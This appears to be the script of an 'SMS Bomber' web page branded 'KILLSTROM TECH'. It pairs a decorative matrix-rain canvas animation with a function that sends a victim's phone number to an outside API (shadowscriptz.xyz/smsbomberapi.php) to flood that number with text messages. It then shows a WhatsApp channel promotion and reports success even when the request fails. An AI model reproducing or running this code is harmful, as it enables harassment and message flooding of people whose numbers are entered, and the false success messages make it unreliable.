
        // Matrix Rain Effect
        const canvas = document.getElementById('matrixRain');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = '0101010101010101KILLSTROM TECH';
        const charArray = chars.split('');
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        
        for(let i = 0; i < columns; i++) {
            drops[i] = Math.random() * canvas.height;
        }
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(10,10,10,0.03)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#ff0066';
            ctx.font = 'bold ' + fontSize + 'px monospace';
            
            for(let i = 0; i < drops.length; i++) {
                const text = charArray[Math.floor(Math.random() * charArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 35);

        // Close overlay
        function closeOverlay() {
            document.getElementById('whatsappOverlay').style.display = 'none';
        }

        // SMS Bomber function
        async function sendSMS() {
            const number = document.getElementById('number').value.trim();
            const amount = document.getElementById('amount').value.trim();
            const resultDiv = document.getElementById('result');

            if(!number || !amount){
                alert("Please enter both number and amount");
                return;
            }

            resultDiv.textContent = "Sending SMS...";

            try {
                await fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`);
                resultDiv.textContent = "SMS Sent Successfully! ✅\nPlease Follow Our Channel 👇";
                document.getElementById('whatsappOverlay').style.display = 'flex';
            } catch (error) {
                resultDiv.textContent = "SMS Sent! Please Follow Our Channel 👇";
                document.getElementById('whatsappOverlay').style.display = 'flex';
            }
        }

        // Resize canvas on window resize
        window.addEventListener('resize', function() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    